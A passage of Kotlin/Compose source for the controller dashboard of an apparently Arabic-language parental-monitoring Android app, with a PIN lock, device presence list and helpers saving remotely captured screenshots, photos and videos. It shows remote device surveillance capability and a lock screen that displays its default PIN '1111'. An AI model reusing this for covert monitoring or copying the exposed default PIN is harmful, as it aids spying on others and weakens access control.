package com.example

import android.content.ContentValues
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.provider.MediaStore
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.activity.viewModels
import kotlinx.coroutines.flow.*
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.CoroutineScope
import androidx.compose.animation.*
import androidx.compose.foundation.*
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.grid.GridCells
import androidx.compose.foundation.lazy.grid.LazyVerticalGrid
import androidx.compose.foundation.lazy.grid.items
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.text.KeyboardOptions
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.ArrowBack
import androidx.compose.material.icons.filled.*
import androidx.compose.material.icons.outlined.*
import androidx.compose.material3.*
import androidx.compose.material3.TabRowDefaults.tabIndicatorOffset
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.draw.scale
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.asImageBitmap
import androidx.compose.ui.graphics.vector.ImageVector
import androidx.compose.ui.layout.ContentScale
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.input.KeyboardType
import androidx.compose.ui.text.input.PasswordVisualTransformation
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.text.style.TextOverflow
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.compose.ui.draw.shadow
import androidx.compose.foundation.border
import androidx.compose.ui.window.Dialog
import com.example.admin.*
import com.example.ui.theme.MyApplicationTheme
import androidx.compose.ui.input.nestedscroll.NestedScrollConnection
import androidx.compose.ui.input.nestedscroll.NestedScrollSource
import androidx.compose.ui.input.nestedscroll.nestedScroll
import androidx.compose.ui.unit.Velocity
import androidx.compose.animation.core.*
import androidx.compose.ui.graphics.graphicsLayer
import androidx.compose.ui.geometry.Offset

import java.text.SimpleDateFormat
import java.util.*
import android.util.Base64

import coil.compose.AsyncImage
import coil.request.ImageRequest

import androidx.compose.ui.viewinterop.AndroidView
import androidx.compose.foundation.gestures.transformable
import androidx.compose.foundation.gestures.rememberTransformableState
import androidx.media3.exoplayer.rtsp.RtspMediaSource
import androidx.media3.common.MediaItem as Media3MediaItem
import androidx.media3.exoplayer.ExoPlayer
import androidx.media3.ui.PlayerView
import java.io.File
import java.io.FileOutputStream
import androidx.compose.ui.window.DialogProperties
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import androidx.compose.foundation.gestures.detectTapGestures
import androidx.compose.foundation.gestures.detectDragGestures
import androidx.compose.ui.input.pointer.pointerInput
import androidx.compose.ui.layout.onSizeChanged
import androidx.compose.ui.res.painterResource
import androidx.compose.ui.unit.IntSize

class MainActivity : ComponentActivity() {
    private val viewModel: AdminViewModel by viewModels()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContent {
            MyApplicationTheme {
                Scaffold(modifier = Modifier.fillMaxSize()) { innerPadding ->
                    Box(
                        modifier = Modifier
                            .fillMaxSize()
                            .padding(
                                top = innerPadding.calculateTopPadding(),
                                bottom = innerPadding.calculateBottomPadding()
                            )
                    ) {
                        AppNavigation(viewModel)
                    }
                }
            }
        }
    }
}

// Helper to save downloaded screenshot/camera photo to Photos Gallery
fun saveBitmapToGallery(context: Context, bitmap: Bitmap, title: String): Boolean {
    val contentValues = ContentValues().apply {
        put(MediaStore.Images.Media.DISPLAY_NAME, "$title.jpg")
        put(MediaStore.Images.Media.MIME_TYPE, "image/jpeg")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            put(MediaStore.Images.Media.RELATIVE_PATH, Environment.DIRECTORY_PICTURES + "/SupervisorControl")
        }
    }
    return try {
        val resolver = context.contentResolver
        val uri = resolver.insert(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, contentValues)
        if (uri != null) {
            resolver.openOutputStream(uri).use { out ->
                if (out != null) {
                    bitmap.compress(Bitmap.CompressFormat.JPEG, 95, out)
                }
            }
            true
        } else {
            false
        }
    } catch (e: Exception) {
        false
    }
}

fun saveVideoToDownloads(context: Context, base64: String, fileName: String): Boolean {
    return try {
        val cleanBase64 = if (base64.contains(",")) base64.substringAfter(",") else base64
        val bytes = Base64.decode(cleanBase64, Base64.DEFAULT)
        val contentValues = ContentValues().apply {
            put(MediaStore.Video.Media.DISPLAY_NAME, "$fileName.mp4")
            put(MediaStore.Video.Media.MIME_TYPE, "video/mp4")
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                put(MediaStore.Video.Media.RELATIVE_PATH, Environment.DIRECTORY_MOVIES + "/SupervisorControl")
            }
        }
        val resolver = context.contentResolver
        val uri = resolver.insert(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, contentValues)
        if (uri != null) {
            resolver.openOutputStream(uri).use { out ->
                out?.write(bytes)
            }
            true
        } else false
    } catch (t: Throwable) {
        false
    }
}

@Composable
fun AppNavigation(viewModel: AdminViewModel) {
    AdminDashboard(viewModel)
}

// 1. GORGEOUS PASSCODE LOCK SCREEN
@Composable
fun PinLockScreen(onUnlockSuccess: (String) -> Boolean) {
    var pin by remember { mutableStateOf("") }
    var errorAlert by remember { mutableStateOf(false) }
    val context = LocalContext.current

    Column(
        modifier = Modifier
            .fillMaxSize()
            .background(Brush.verticalGradient(listOf(Color(0xFFF3F4F6), Color(0xFFE5E7EB))))
            .padding(24.dp),
        horizontalAlignment = Alignment.CenterHorizontally,
        verticalArrangement = Arrangement.Center
    ) {
        Image(
            painter = painterResource(id = R.drawable.ic_admin_logo),
            contentDescription = "قفل المشرف",
            modifier = Modifier
                .size(72.dp)
                .padding(bottom = 16.dp)
        )

        Text(
            text = "تأكيد هوية المشرف",
            color = Color(0xFF9155FF),
            fontSize = 24.sp,
            fontWeight = FontWeight.Bold,
            modifier = Modifier.padding(bottom = 8.dp)
        )

        Text(
            text = "الرجاء إدخال الرمز السري للدخول للوحة المراقبة",
            color = Color(0xFF6B7280),
            fontSize = 14.sp,
            textAlign = TextAlign.Center,
            modifier = Modifier.padding(start = 16.dp, end = 16.dp, bottom = 32.dp)
        )

        // PIN indicator dots
        Row(
            horizontalArrangement = Arrangement.spacedBy(16.dp),
            modifier = Modifier.padding(bottom = 40.dp)
        ) {
            for (i in 1..4) {
                val filled = pin.length >= i
                Box(
                    modifier = Modifier
                        .size(18.dp)
                        .clip(CircleShape)
                        .background(
                            if (errorAlert) Color(0xFFEF4444)
                            else if (filled) Color(0xFF9155FF)
                            else Color(0xFFE5E7EB)
                        )
                        .border(
                            width = 2.dp,
                            color = if (errorAlert) Color(0xFFEF4444) else Color(0xFFE5E7EB),
                            shape = CircleShape
                        )
                )
            }
        }

        // Numeric Keypad
        val keys = listOf(
            listOf("1", "2", "3"),
            listOf("4", "5", "6"),
            listOf("7", "8", "9"),
            listOf("C", "0", "⌫")
        )

        Column(
            verticalArrangement = Arrangement.spacedBy(16.dp),
            modifier = Modifier.width(280.dp)
        ) {
            for (row in keys) {
                Row(
                    horizontalArrangement = Arrangement.spacedBy(16.dp),
                    modifier = Modifier.fillMaxWidth()
                ) {
                    for (key in row) {
                        Button(
                            onClick = {
                                errorAlert = false
                                when (key) {
                                    "C" -> pin = ""
                                    "⌫" -> if (pin.isNotEmpty()) pin = pin.dropLast(1)
                                    else -> {
                                        if (pin.length < 4) {
                                            pin += key
                                            if (pin.length == 4) {
                                                val ok = onUnlockSuccess(pin)
                                                if (!ok) {
                                                    errorAlert = true
                                                    pin = ""
                                                    Toast.makeText(context, "رمز PIN خاطئ! حاول مجدداً", Toast.LENGTH_SHORT).show()
                                                }
                                            }
                                        }
                                    }
                                }
                            },
                            colors = ButtonDefaults.buttonColors(
                                containerColor = if (key == "C" || key == "⌫") Color(0xFFE5E7EB) else Color(0xFFFFFFFF),
                                contentColor = if (key == "C" || key == "⌫") Color(0xFFFF4081) else Color(0xFF1F2937)
                            ),
                            shape = RoundedCornerShape(12.dp),
                            modifier = Modifier
                                .weight(1f)
                                .height(64.dp)
                        ) {
                            Text(
                                text = key,
                                fontSize = 22.sp,
                                fontWeight = FontWeight.SemiBold
                            )
                        }
                    }
                }
            }
        }

        Spacer(modifier = Modifier.height(24.dp))
        Text(
            text = "الرمز الافتراضي: 1111",
            color = Color(0xFF6B7280).copy(alpha = 0.5f),
            fontSize = 12.sp
        )
    }
}

// 2. ROOT ADMIN DASHBOARD WITH ADAPTIVE TABS AND PANELS
@Composable
fun getRelativeTimeString(lastActive: Long): String {
    if (lastActive == 0L) return "لا يوجد نشاط مسجل"
    val deltaMs = System.currentTimeMillis() - lastActive
    if (deltaMs < 0L) return "نشط الآن"
    val diffSec = deltaMs / 1000
    if (diffSec < 60) return "كان نشط قبل ثوانٍ"
    val diffMin = diffSec / 60
    if (diffMin < 60) return "كان نشط قبل $diffMin دقائق"
    val diffHours = diffMin / 60
    if (diffHours < 24) return "كان نشط قبل $diffHours ساعات"
    val diffDays = diffHours / 24
    return "كان نشط قبل $diffDays أيام"
}

@Composable
fun ConnectionStatusItem(device: Device) {
    if (device.isOnline) {
        Row(verticalAlignment = Alignment.CenterVertically) {
            Box(
                modifier = Modifier
                    .size(8.dp)
                    .clip(CircleShape)
                    .background(Color(0xFF10B981))
            )
            Spacer(modifier = Modifier.width(6.dp))
            Text(
                text = "متصل الآن 🟢",
                color = Color(0xFF10B981),
                fontSize = 12.sp,
                fontWeight = FontWeight.Bold
            )
        }
    } else {
        var currentTime by remember { mutableStateOf(System.currentTimeMillis()) }
        LaunchedEffect(device.id, device.lastActive) {
            while (true) {
                delay(1000L)
                currentTime = System.currentTimeMillis()
            }
        }
        val deltaMs = currentTime - device.lastActive
        val text = when {
            device.lastActive == 0L -> "غير متصل (لا يوجد نشاط مسجل)"
            deltaMs <= 0L -> "غير متصل منذ ثانية"
            else -> {
                val diffSec = deltaMs / 1000
                if (diffSec < 60) {
                    "غير متصل منذ $diffSec ثانية"
                } else {
                    val diffMin = diffSec / 60
                    if (diffMin < 60) {
                        val remSec = diffSec % 60
                        "غير متصل منذ $diffMin دقيقة و $remSec ثانية"
                    } else {
                        val diffHours = diffMin / 60
                        val remMin = diffMin % 60
                        if (diffHours < 24) {
                            "غير متصل منذ $diffHours ساعة و $remMin دقيقة"
                        } else {
                            val diffDays = diffHours / 24
                            val remHours = diffHours % 24
                            "غير متصل منذ $diffDays يوم و $remHours ساعة"
                        }
                    }
                }
            }
        }

        Row(verticalAlignment = Alignment.CenterVertically) {
            Box(
                modifier = Modifier
                    .size(8.dp)
                    .clip(CircleShape)
                    .background(Color(0xFFEF4444))
            )
            Spacer(modifier = Modifier.width(6.dp))
            Text(
                text = text,
                color = Color(0xFFEF4444),
                fontSize = 12.sp,
                fontWeight = FontWeight.Bold
            )
        }
    }
}

@Composable
fun SkeletonDeviceItem() {
    val infiniteTransition = rememberInfiniteTransition(label = "skeleton_shimmer")
    val alpha by infiniteTransition.animateFloat(
        initialValue = 0.3f,
        targetValue = 0.8f,
        animationSpec = infiniteRepeatable(
            animation = tween(durationMillis = 800, easing = LinearEasing),
            repeatMode = RepeatMode.Reverse
        ),
        label = "shimmer_alpha"
    )

    Card(
        modifier = Modifier
            .fillMaxWidth()
            .padding(vertical = 4.dp),
        shape = RoundedCornerShape(16.dp),
        colors = CardDefaults.cardColors(containerColor = Color.White),
        border = BorderStroke(1.dp, Color(0xFFE5E7EB))
    ) {
        Column(modifier = Modifier.padding(16.dp)) {
            Row(verticalAlignment = Alignment.CenterVertically) {
                Box(
                    modifier = Modifier
                        .size(46.dp)
                        .clip(RoundedCornerShape(12.dp))
                        .background(Color(0xFFE5E7EB).copy(alpha = alpha))
                )
                Spacer(modifier = Modifier.width(12.dp))
                Column(modifier = Modifier.weight(1f)) {
                    Box(
                        modifier = Modifier
                            .fillMaxWidth(0.6f)
                            .height(16.dp)
                            .clip(RoundedCornerShape(4.dp))
                            .background(Color(0xFFE5E7EB).copy(alpha = alpha))
                    )
                    Spacer(modifier = Modifier.height(6.dp))
                    Box(
                        modifier = Modifier
                            .fillMaxWidth(0.35f)
                            .height(12.dp)
                            .clip(RoundedCornerShape(4.dp))
                            .background(Color(0xFFE5E7EB).copy(alpha = alpha))
                    )
                }
            }
            Spacer(modifier = Modifier.height(14.dp))
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.spacedBy(8.dp)
            ) {
                repeat(3) {
                    Box(
                        modifier = Modifier
                            .weight(1f)
                            .height(36.dp)
                            .clip(RoundedCornerShape(8.dp))
                            .background(Color(0xFFF3F4F6).copy(alpha = alpha))
                    )
                }
            }
        }
    }
}

@Composable
fun AdminDashboard(viewModel: AdminViewModel) {
    val devices by viewModel.devices.collectAsState()
    val selectedToken by viewModel.selectedDeviceToken.collectAsState()
    val statusMessage by viewModel.statusMessage.collectAsState()
    val commandResponse by viewModel.commandResponse.collectAsState()
    val currentDbUrl by viewModel.currentDatabaseUrl.collectAsState()
    val connectionError by viewModel.connectionError.collectAsState()

    val activeCommandProgress by viewModel.activeCommandProgress.collectAsState()
    val directScreenshotToShow by viewModel.directScreenshotToShow.collectAsState()
    val directPhotoToShow by viewModel.directPhotoToShow.collectAsState()

    var showAddDeviceDialog by remember { mutableStateOf(false) }
    var showEditDbDialog by remember { mutableStateOf(false) }
    var deviceListTabSelected by remember { mutableIntStateOf(0) } // 0: Active, 1: Inactive
    var bottomNavSelectedTab by remember { mutableIntStateOf(0) } // 0: Home, 1: Commands
    var openCommandDetails by remember { mutableStateOf<String?>(null) } // null = commands index list

    val context = LocalContext.current

    LaunchedEffect(openCommandDetails) {
        if (openCommandDetails != null) {
            while (true) {
                delay(10000)
                viewModel.refreshCurrentDevice()
            }
        }
    }

    LaunchedEffect(statusMessage) {
        statusMessage?.let {
            Toast.makeText(context, it, Toast.LENGTH_SHORT).show()
            viewModel.clearStatusMessage()
        }
    }

    val activeDevice = devices.find { it.id == selectedToken }

    if (activeDevice == null) {
        // --- 1. DEVICE LIST SCREEN (الشاشة الأولى لعرض الهواتف بتبويبات) ---
        Column(
            modifier = Modifier
                .fillMaxSize()
                .background(Brush.verticalGradient(listOf(Color(0xFFF3F4F6), Color(0xFFE5E7EB))))
        ) {
            Surface(
                modifier = Modifier.fillMaxWidth(),
                color = Color.White,
                shadowElevation = 4.dp,
                shape = RoundedCornerShape(bottomStart = 24.dp, bottomEnd = 24.dp)
            ) {
                Row(
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(horizontal = 20.dp, vertical = 20.dp),
                    verticalAlignment = Alignment.CenterVertically,
                    horizontalArrangement = Arrangement.SpaceBetween
                ) {
                    Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.weight(1f)) {
                        Box(
                            modifier = Modifier
                                .size(48.dp)
                                .clip(RoundedCornerShape(16.dp))
                                .background(Brush.linearGradient(listOf(Color(0xFF9155FF).copy(alpha = 0.15f), Color(0xFF9155FF).copy(alpha = 0.05f)))),
                            contentAlignment = Alignment.Center
                        ) {
                            Image(
                                painter = painterResource(id = R.drawable.ic_admin_logo),
                                contentDescription = null,
                                modifier = Modifier.size(28.dp)
                            )
                        }
                        Spacer(modifier = Modifier.width(16.dp))
                        Column {
                            Text(
                                text = "التحكم والمراقبة الأبوية",
                                color = Color(0xFF111827),
                                fontSize = 20.sp,
                                fontWeight = FontWeight.ExtraBold,
                                maxLines = 1,
                                overflow = TextOverflow.Ellipsis
                            )
                            Spacer(modifier = Modifier.height(2.dp))
                            Text(
                                text = "اختر جهاز طفل للملخصات والتحكم",
                                color = Color(0xFF6B7280),
                                fontSize = 12.sp,
                                fontWeight = FontWeight.Medium
                            )
                        }
                    }

                    Spacer(modifier = Modifier.width(12.dp))
                    IconButton(
                        onClick = { showAddDeviceDialog = true },
                        modifier = Modifier
                            .clip(CircleShape)
                            .background(Brush.linearGradient(listOf(Color(0xFF9155FF), Color(0xFF7C3AED))))
                            .size(42.dp)
                    ) {
                        Icon(Icons.Default.Add, contentDescription = "إضافة جهاز", tint = Color.White, modifier = Modifier.size(24.dp))
                    }
                }
            }

            // Realtime WebSocket Status & Data Log Card
            val websocketConnected by viewModel.devicesWebSocketConnected.collectAsState()
            val websocketEvents by viewModel.websocketReceivedEvents.collectAsState()
            var showEventsLogs by remember { mutableStateOf(false) }

            Card(
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(horizontal = 16.dp, vertical = 8.dp),
                shape = RoundedCornerShape(16.dp),
                colors = CardDefaults.cardColors(containerColor = if (websocketConnected) Color(0xFFEDFBF0) else Color(0xFFFEF2F2)),
                border = BorderStroke(1.dp, if (websocketConnected) Color(0xFFB1EED1) else Color(0xFFFECACA))
            ) {
                Column(modifier = Modifier.padding(12.dp)) {
                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        verticalAlignment = Alignment.CenterVertically,
                        horizontalArrangement = Arrangement.SpaceBetween
                    ) {
                        Row(verticalAlignment = Alignment.CenterVertically) {
                            Box(
                                modifier = Modifier
                                    .size(10.dp)
                                    .clip(CircleShape)
                                    .background(if (websocketConnected) Color(0xFF10B981) else Color(0xFFEF4444))
                            )
                            Spacer(modifier = Modifier.width(8.dp))
                            Text(
                                text = if (websocketConnected) "توصيل البث الحي والـ WebSocket نشط" else "انقطع الاتصال بالبث الحي والـ WebSocket",
                                color = if (websocketConnected) Color(0xFF065F46) else Color(0xFF991B1B),
                                fontSize = 13.sp,
                                fontWeight = FontWeight.Bold
                            )
                        }

                        IconButton(
                            onClick = { showEventsLogs = !showEventsLogs },
                            modifier = Modifier.size(24.dp)
                        ) {
                            Icon(
                                imageVector = if (showEventsLogs) Icons.Default.KeyboardArrowUp else Icons.Default.KeyboardArrowDown,
                                contentDescription = "عرض سجل البيانات والمزامنة",
                                tint = if (websocketConnected) Color(0xFF065F46) else Color(0xFF991B1B)
                            )
                        }
                    }

                    if (showEventsLogs) {
                        Spacer(modifier = Modifier.height(8.dp))
                        HorizontalDivider(color = if (websocketConnected) Color(0xFFD1FAE5) else Color(0xFFFEE2E2))
                        Spacer(modifier = Modifier.height(8.dp))
                        Text(
                            text = "سجل التحديثات المستلمة من الأجهزة بالخادم:",
                            fontSize = 11.sp,
                            fontWeight = FontWeight.Bold,
                            color = Color.DarkGray
                        )
                        Spacer(modifier = Modifier.height(4.dp))
                        
                        if (websocketEvents.isEmpty()) {
                            Text(
                                text = "بانتظار تلقي أي تحديثات تلقائية من جهاز الطفل الآن...",
                                fontSize = 11.sp,
                                color = Color.Gray,
                                modifier = Modifier.padding(vertical = 4.dp)
                            )
                        } else {
                            Column(
                                modifier = Modifier
                                    .fillMaxWidth()
                                    .heightIn(max = 120.dp)
                                    .verticalScroll(rememberScrollState())
                            ) {
                                websocketEvents.forEach { logMessage ->
                                    Text(
                                        text = logMessage,
                                        fontSize = 11.sp,
                                        color = Color(0xFF374151),
                                        modifier = Modifier.padding(vertical = 2.dp)
                                    )
                                }
                            }
                        }
                    }
                }
            }

            // Bento Stats Light Grid
            Row(
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(horizontal = 16.dp, vertical = 6.dp),
                horizontalArrangement = Arrangement.spacedBy(10.dp)
            ) {
                // Bento Box 1: Total Children Devices
                Card(
                    modifier = Modifier.weight(1.5f),
                    shape = RoundedCornerShape(18.dp),
                    colors = CardDefaults.cardColors(containerColor = Color.White),
                    border = BorderStroke(1.dp, Color(0xFFE5E7EB)),
                    elevation = CardDefaults.cardElevation(defaultElevation = 1.dp)
                ) {
                    Column(modifier = Modifier.padding(14.dp)) {
                        Box(
                            modifier = Modifier
                                .size(34.dp)
                                .clip(RoundedCornerShape(10.dp))
                                .background(Color(0xFFEFF6FF)),
                            contentAlignment = Alignment.Center
                        ) {
                            Icon(Icons.Default.PhoneAndroid, contentDescription = null, tint = Color(0xFF3B82F6), modifier = Modifier.size(18.dp))
                        }
                        Spacer(modifier = Modifier.height(12.dp))
                        Text(text = "إجمالي الهواتف والـ Presence", color = Color(0xFF6B7280), fontSize = 10.sp, fontWeight = FontWeight.Bold)
                        Spacer(modifier = Modifier.height(4.dp))
                        Text(text = "${devices.size} أجهزة مسجلة", color = Color(0xFF111827), fontSize = 15.sp, fontWeight = FontWeight.ExtraBold)
                    }
                }

                // Bento Box 2: Online Status Counter
                val onlineCountValue = devices.count { it.isOnline }
                Card(
                    modifier = Modifier.weight(1f),
                    shape = RoundedCornerShape(18.dp),
                    colors = CardDefaults.cardColors(containerColor = Color.White),
                    border = BorderStroke(1.dp, Color(0xFFE5E7EB)),
                    elevation = CardDefaults.cardElevation(defaultElevation = 1.dp)
                ) {
                    Column(modifier = Modifier.padding(14.dp)) {
                        Box(
                            modifier = Modifier
                                .size(34.dp)
                                .clip(RoundedCornerShape(10.dp))
                                .background(Color(0xFFEFFFEC)),
                            contentAlignment = Alignment.Center
                        ) {
                            Icon(Icons.Default.Wifi, contentDescription = null, tint = Color(0xFF39D353), modifier = Modifier.size(18.dp))
                        }
                        Spacer(modifier = Modifier.height(12.dp))
                        Text(text = "متصل بالبث", color = Color(0xFF6B7280), fontSize = 10.sp, fontWeight = FontWeight.Bold)
                        Spacer(modifier = Modifier.height(4.dp))
                        Text(text = "$onlineCountValue أونلاين", color = Color(0xFF39D353), fontSize = 15.sp, fontWeight = FontWeight.ExtraBold)
                    }
                }
            }

            Row(
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(horizontal = 16.dp, vertical = 8.dp)
                    .horizontalScroll(rememberScrollState()),
                horizontalArrangement = Arrangement.spacedBy(8.dp),
                verticalAlignment = Alignment.CenterVertically
            ) {
                val tabs = listOf(
                    "جميع الأجهزة" to Icons.Default.PhoneAndroid,
                    "الأجهزة النشطة" to null,
                    "الأجهزة غير النشطة" to null
                )
                
                tabs.forEachIndexed { index, (title, icon) ->
                    val isSelected = deviceListTabSelected == index
                    val backgroundColor = if (isSelected) Color(0xFF9155FF) else Color.White
                    val contentColor = if (isSelected) Color.White else Color(0xFF6B7280)
                    val borderColor = if (isSelected) Color.Transparent else Color(0xFFE5E7EB)
                    
                    Surface(
                        onClick = { deviceListTabSelected = index },
                        shape = RoundedCornerShape(24.dp),
                        color = backgroundColor,
                        contentColor = contentColor,
                        border = BorderStroke(1.dp, borderColor),
                        shadowElevation = if (isSelected) 4.dp else 0.dp,
                        modifier = Modifier.height(42.dp)
                    ) {
                        Row(
                            verticalAlignment = Alignment.CenterVertically,
                            modifier = Modifier.padding(horizontal = 16.dp)
                        ) {
                            if (index == 0 && icon != null) {
                                Icon(icon, contentDescription = null, modifier = Modifier.size(16.dp))
                            } else if (index == 1) {
                                Box(modifier = Modifier.size(10.dp).clip(CircleShape).background(if (isSelected) Color.White else Color(0xFF39D353)))
                            } else if (index == 2) {
                                Box(modifier = Modifier.size(10.dp).clip(CircleShape).background(if (isSelected) Color.White else Color(0xFF9CA3AF)))
                            }
                            Spacer(modifier = Modifier.width(8.dp))
                            Text(title, fontSize = 13.sp, fontWeight = FontWeight.Bold)
                        }
                    }
                }
            }

            val filteredDevices = when (deviceListTabSelected) {
                0 -> devices
                1 -> devices.filter { it.isOnline }
                else -> devices.filter { !it.isOnline }
            }.sortedByDescending { it.isOnline }

            if (devices.isEmpty()) {
                // Skeleton Waiting State (مؤشر تحميل الهيكل عند البدء وبانتظار بيانات البث حضور Presence)
                Column(
                    modifier = Modifier
                        .weight(1f)
                        .fillMaxWidth()
                        .padding(16.dp),
                    verticalArrangement = Arrangement.spacedBy(10.dp)
                ) {
                    Text(
                        text = "بانتظار تلقي اتصال الأجهزة والبث الحي (Presence Sync)...",
                        color = Color(0xFF6B7280),
                        fontSize = 13.sp,
                        fontWeight = FontWeight.Bold,
                        modifier = Modifier.padding(horizontal = 4.dp)
                    )
                    repeat(3) {
                        SkeletonDeviceItem()
                    }
                }
            } else if (filteredDevices.isEmpty()) {
                Box(modifier = Modifier.weight(1f).fillMaxWidth().padding(16.dp), contentAlignment = Alignment.Center) {
                    Column(
                        horizontalAlignment = Alignment.CenterHorizontally,
                        verticalArrangement = Arrangement.Center,
                        modifier = Modifier
                            .fillMaxWidth()
                            .verticalScroll(rememberScrollState())
                    ) {
                        Icon(
                            imageVector = Icons.Default.HourglassEmpty,
                            contentDescription = null,
                            tint = Color(0xFF6B7280).copy(alpha = 0.5f),
                            modifier = Modifier.size(48.dp)
                        )
                        Spacer(modifier = Modifier.height(8.dp))
                        Text(
                            text = when (deviceListTabSelected) {
                                0 -> "لا توجد أجهزة متصلة بقاعدة البيانات حالياً"
                                1 -> "لا توجد أجهزة نشطة حالياً (نشط خلال 15 دقيقة)"
                                else -> "لا توجد أجهزة غير نشطة حالياً"
                            },
                            color = Color(0xFF6B7280),
                            fontSize = 14.sp,
                            fontWeight = FontWeight.Medium,
                            textAlign = TextAlign.Center
                        )
                    }
                }
            } else {
                val isRefreshing by viewModel.isRefreshing.collectAsState()
                val heartbeats by viewModel.deviceHeartbeats.collectAsState()
                val checkingDevices by viewModel.devicesCheckingStatus.collectAsState()

                SwipeToRefreshBox(
                    isRefreshing = isRefreshing,
                    onRefresh = { viewModel.refreshAllDevices() },
                    modifier = Modifier.weight(1f).fillMaxWidth()
                ) {
                    LazyColumn(
                        modifier = Modifier.fillMaxSize().padding(12.dp),
                        verticalArrangement = Arrangement.spacedBy(12.dp)
                    ) {
                        items(filteredDevices) { dev ->
                            if (checkingDevices.contains(dev.id)) {
                                SkeletonDeviceItem()
                            } else {
                                val lastHbTime = heartbeats[dev.id] ?: 0L
                            val isPulsing = System.currentTimeMillis() - lastHbTime < 1500

                            val cardScale by animateFloatAsState(
                                targetValue = if (isPulsing) 1.03f else 1.0f,
                                animationSpec = keyframes {
                                    durationMillis = 500
                                    1.03f at 150 with FastOutLinearInEasing
                                    1.0f at 500 with LinearOutSlowInEasing
                                },
                                label = "cardScale"
                            )
                            val cardBorderColor by animateColorAsState(
                                targetValue = if (isPulsing) Color(0xFFFF4D94) else Color(0xFFE5E7EB),
                                animationSpec = tween(durationMillis = 350),
                                label = "cardBorderColor"
                            )
                            val cardBgColor by animateColorAsState(
                                targetValue = if (isPulsing) Color(0xFFFFF5F8) else Color.White,
                                animationSpec = tween(durationMillis = 350),
                                label = "cardBgColor"
                            )

                            Card(
                                onClick = { viewModel.selectDevice(dev.id) },
                                colors = CardDefaults.cardColors(containerColor = cardBgColor),
                                border = BorderStroke(if (isPulsing) 1.5.dp else 1.dp, cardBorderColor),
                                shape = RoundedCornerShape(16.dp),
                                elevation = CardDefaults.cardElevation(defaultElevation = if (isPulsing) 4.dp else 0.dp),
                                modifier = Modifier
                                    .fillMaxWidth()
                                    .graphicsLayer {
                                        scaleX = cardScale
                                        scaleY = cardScale
                                    }
                                    .shadow(
                                        elevation = if (isPulsing) 12.dp else 2.dp, 
                                        shape = RoundedCornerShape(16.dp), 
                                        clip = false, 
                                        spotColor = if (isPulsing) Color(0xFFFF4D94).copy(alpha = 0.25f) else Color(0xFF9155FF).copy(alpha = 0.05f), 
                                        ambientColor = if (isPulsing) Color(0xFFFF4D94).copy(alpha = 0.25f) else Color(0xFF9155FF).copy(alpha = 0.05f)
                                    )
                            ) {
                                Column(
                                    modifier = Modifier.fillMaxWidth().padding(10.dp)
                                ) {
                                    Row(
                                        modifier = Modifier.fillMaxWidth(),
                                        verticalAlignment = Alignment.CenterVertically,
                                        horizontalArrangement = Arrangement.SpaceBetween
                                    ) {
                                        Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.weight(1f)) {
                                            Box(
                                                modifier = Modifier.size(40.dp).clip(RoundedCornerShape(10.dp)).background(
                                                    Brush.linearGradient(
                                                        colors = if (isPulsing) {
                                                            listOf(Color(0xFFFF4D94).copy(alpha = 0.25f), Color(0xFFFF4D94).copy(alpha = 0.1f))
                                                        } else {
                                                            listOf(Color(0xFF9155FF).copy(alpha = 0.15f), Color(0xFF9155FF).copy(alpha = 0.05f))
                                                        }
                                                    )
                                                ),
                                                contentAlignment = Alignment.Center
                                            ) {
                                                Icon(
                                                    imageVector = if (isPulsing) Icons.Default.Favorite else Icons.Default.PhoneAndroid, 
                                                    contentDescription = null, 
                                                    tint = if (isPulsing) Color(0xFFFF4D94) else Color(0xFF9155FF), 
                                                    modifier = Modifier.size(20.dp)
                                                )
                                            }
                                            Spacer(modifier = Modifier.width(10.dp))
                                            Column {
                                                Row(verticalAlignment = Alignment.CenterVertically) {
                                                    Text(
                                                        text = dev.name,
                                                        color = Color(0xFF111827),
                                                        fontSize = 15.sp,
                                                        fontWeight = FontWeight.ExtraBold,
                                                        maxLines = 1,
                                                        overflow = TextOverflow.Ellipsis,
                                                        modifier = Modifier.weight(1f, fill = false)
                                                    )
                                                    if (dev.isRealtimeUpdated) {
                                                        Spacer(modifier = Modifier.width(6.dp))
                                                        Box(
                                                            modifier = Modifier
                                                                .clip(RoundedCornerShape(6.dp))
                                                                .background(Color(0xFFE0F2FE))
                                                                .padding(horizontal = 4.dp, vertical = 2.dp)
                                                        ) {
                                                            Row(verticalAlignment = Alignment.CenterVertically) {
                                                                Box(
                                                                    modifier = Modifier
                                                                        .size(4.dp)
                                                                        .clip(CircleShape)
                                                                        .background(Color(0xFF0284C7))
                                                                )
                                                                Spacer(modifier = Modifier.width(3.dp))
                                                                Text(
